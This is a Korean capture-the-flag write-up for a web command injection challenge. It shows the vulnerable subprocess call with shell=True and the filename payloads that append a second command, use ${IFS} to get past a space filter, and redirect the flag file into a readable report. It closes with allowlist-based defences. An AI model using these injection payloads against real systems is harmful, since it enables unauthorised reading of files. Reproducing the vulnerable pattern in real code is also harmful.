# Command Injection Writeup

## 문제 개요

`Admin Report Inspector`는 서버 내부의 report 파일을 조회하는 관리자용 도구처럼 보이는 문제입니다.

사용자는 파일명을 입력할 수 있고, 서버는 아래 형태의 shell 명령어를 실행합니다.

```python
command = f"head -n 20 {REPORT_DIR}/{filename}"
subprocess.run(command, shell=True, ...)
```

입력값이 shell 명령어 문자열에 그대로 붙기 때문에 command injection이 가능합니다.

## 문제 설계 의도

단순히 `; cat flag.txt`를 넣는 풀이가 되지 않도록 몇 가지 제한을 넣었습니다.

- 공백 차단
- `..` 차단
- `cat` 문자열 차단
- 안전한 파일명 정규식에 맞지 않는 입력은 실행 결과를 바로 보여주지 않음

하지만 shell metacharacter 자체는 막지 않으므로 `;`, `$`, `{}`, redirection 같은 shell 기능을 이용할 수 있습니다.

## 취약점 분석

정상 입력 예시는 다음과 같습니다.

```text
notice.txt
```

이 경우 서버 내부에서는 대략 아래 명령이 실행됩니다.

```bash
head -n 20 /app/reports/notice.txt
```

문제는 입력값 뒤에 `;`를 붙이면 새 명령을 이어서 실행할 수 있다는 점입니다.

공백은 차단되어 있으므로 일반적인 명령은 그대로 쓸 수 없습니다.

```text
notice.txt;head -n 1 /app/flag.txt
```

위 입력은 공백 때문에 차단됩니다. 대신 shell에서 공백처럼 확장되는 `${IFS}`를 사용합니다.

```text
notice.txt;head${IFS}-n${IFS}1${IFS}/app/flag.txt
```

다만 이 입력은 안전한 파일명 정규식에 맞지 않으므로 실행 결과가 화면에 바로 출력되지 않습니다. 따라서 결과를 파일로 저장한 뒤 정상 파일명으로 다시 조회해야 합니다.

## 의도된 풀이

### 1. 플래그를 result.txt에 저장

입력창에 아래 값을 넣습니다.

```text
notice.txt;head${IFS}-n${IFS}1${IFS}/app/flag.txt>/app/reports/result.txt
```

서버에서는 다음 흐름으로 실행됩니다.

```bash
head -n 20 /app/reports/notice.txt;head -n 1 /app/flag.txt>/app/reports/result.txt
```

첫 번째 명령은 정상 파일을 읽고, 두 번째 명령은 `/app/flag.txt`의 첫 줄을 `/app/reports/result.txt`에 저장합니다.

이때 화면에는 플래그가 바로 보이지 않고 `Report inspection completed.`만 표시됩니다. 이것은 의도된 동작입니다.

### 2. result.txt 조회

다시 입력창에 아래 정상 파일명을 넣습니다.

```text
result.txt
```

이번에는 안전한 파일명 정규식에 맞기 때문에 서버가 `reports/result.txt` 내용을 화면에 출력합니다.

## 최종 플래그

```text
FLAG{command_injection_head_games}
```

## 핵심 포인트

1. `shell=True` 상태에서 사용자 입력을 문자열로 붙이면 command injection이 발생합니다.
2. 공백 차단만으로는 shell injection을 막을 수 없습니다. `${IFS}` 같은 shell 확장을 통해 우회할 수 있습니다.
3. `cat` 하나만 막아도 충분하지 않습니다. `head`, `tail`, `sed`, `awk`, redirection 등 대체 방법이 많습니다.
4. 실행 결과를 바로 숨겨도 side effect가 가능하면 우회됩니다. 여기서는 redirection으로 결과 파일을 만든 뒤 다시 조회했습니다.

## 방어 방법

- `shell=True`를 사용하지 않습니다.
- 명령어를 문자열로 합치지 말고 인자 배열로 실행합니다.
- 파일명은 allowlist로만 처리합니다.
- 사용자가 입력한 값으로 절대 경로나 shell metacharacter를 만들 수 없게 합니다.

예시:

```python
allowed_files = {"notice.txt", "health.log", "backup.log", "result.txt"}
if filename not in allowed_files:
    return "invalid file"

completed = subprocess.run(
    ["head", "-n", "20", os.path.join(REPORT_DIR, filename)],
    shell=False,
    ...
)
```
